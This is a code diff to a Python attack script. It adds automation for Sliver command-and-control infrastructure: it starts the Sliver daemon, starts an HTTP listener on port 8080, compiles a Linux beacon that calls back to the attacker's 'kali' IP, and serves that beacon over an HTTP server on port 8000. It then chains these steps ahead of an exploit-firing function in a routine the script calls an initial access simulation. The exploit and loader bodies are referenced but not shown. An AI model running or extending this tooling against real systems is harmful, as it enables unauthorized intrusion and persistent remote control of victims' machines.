@@ -4,6 +4,95 @@ import base64
 from urllib.parse import urlparse
 import subprocess
 import sys
+import os
+
+def is_port_open(port):
+    """Check if a local port is currently in use/open on 127.0.0.1."""
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.settimeout(1)
+        try:
+            s.connect(("127.0.0.1", port))
+            return True
+        except Exception:
+            return False
+
+def ensure_sliver_daemon():
+    """Verify that the sliver-server daemon is active on port 31337.
+    If not active, starts the daemon in the background.
+    """
+    if not is_port_open(31337):
+        print("[*] Sliver daemon is not active. Starting sliver-server daemon...")
+        subprocess.Popen(
+            ["sliver-server", "daemon"],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True
+        )
+        # Give the daemon a few seconds to unpack assets and bind to 31337
+        print("[*] Waiting 12 seconds for Sliver daemon to initialize...")
+        time.sleep(12)
+    else:
+        print("[+] Sliver daemon is active.")
+
+def ensure_sliver_listener():
+    """Verify that the HTTP C2 listener on port 8080 is active.
+    If not active, starts the listener via sliver-client.
+    """
+    cmd = ["sh", "-c", "echo 'jobs' > /tmp/list_jobs.rc && echo 'exit' >> /tmp/list_jobs.rc && sliver-client --rc /tmp/list_jobs.rc"]
+    try:
+        res = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
+        if "8080" not in res.stdout:
+            print("[*] Sliver HTTP listener on port 8080 not active. Starting listener...")
+            start_cmd = ["sh", "-c", "echo 'http -l 8080' > /tmp/start_listener.rc && echo 'exit' >> /tmp/start_listener.rc && sliver-client --rc /tmp/start_listener.rc"]
+            subprocess.run(start_cmd, capture_output=True, text=True, timeout=10)
+            print("[+] Sliver HTTP listener on port 8080 started.")
+        else:
+            print("[+] Sliver HTTP listener on port 8080 is active.")
+    except Exception as e:
+        print(f"[-] Error checking/starting Sliver listener: {e}")
+
+def ensure_beacon_compiled(kali_ip):
+    """Verify that the target Sliver beacon is compiled and exists at /tmp/beacon.
+    If not found, triggers a background garble compilation via sliver-client.
+    """
+    if not os.path.exists("/tmp/beacon"):
+        print(f"[*] Sliver beacon not found at /tmp/beacon. Compiling beacon targeting {kali_ip}:8080...")
+        rc_content = f"generate --http {kali_ip}:8080 --os linux --arch amd64 --save /tmp/beacon\nexit\n"
+        rc_path = "/tmp/compile_beacon.rc"
+        with open(rc_path, "w") as f:
+            f.write(rc_content)
+        
+        cmd = ["sliver-client", "--rc", rc_path]
+        try:
+            res = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
+            if "saved to /tmp/beacon" in res.stdout or os.path.exists("/tmp/beacon"):
+                print("[+] Sliver beacon successfully compiled and saved to /tmp/beacon.")
+            else:
+                print(f"[-] Error compiling beacon: {res.stdout}")
+                sys.exit(1)
+        except subprocess.TimeoutExpired:
+            print("[-] Timeout: Sliver compilation took longer than 90 seconds.")
+            sys.exit(1)
+    else:
+        print("[+] Sliver beacon exists at /tmp/beacon.")
+
+def ensure_file_server():
+    """Verify that the Python HTTP web server on port 8000 is active.
+    If not active, starts it in /tmp to serve the compiled beacon.
+    """
+    if not is_port_open(8000):
+        print("[*] Python delivery web server on port 8000 is not active. Starting server...")
+        subprocess.Popen(
+            ["python3", "-m", "http.server", "8000"],
+            cwd="/tmp",
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            start_new_session=True
+        )
+        time.sleep(2)
+        print("[+] Python delivery web server started on port 8000.")
+    else:
+        print("[+] Python delivery web server is active on port 8000.")
 
 def build_payload(kali_ip, file_port):
     """Generate the Base64-encoded Python loader payload.
@@ -90,6 +179,14 @@ def check_sliver_session():
 def deploy_fileless_c2(target_ip, kali_ip, file_port=8000):
     """Orchestrate the entire initial access simulation."""
     target_url = f"http://{target_ip}"
+    
+    # 0. Check and satisfy all C2 server prerequisites
+    print("[*] Checking C2 orchestration prerequisites...")
+    ensure_sliver_daemon()
+    ensure_sliver_listener()
+    ensure_beacon_compiled(kali_ip)
+    ensure_file_server()
+    print("[+] All C2 prerequisites are satisfied.")
     
     # 1. Fire the exploit
     fire_exploit(target_url, kali_ip, file_port)
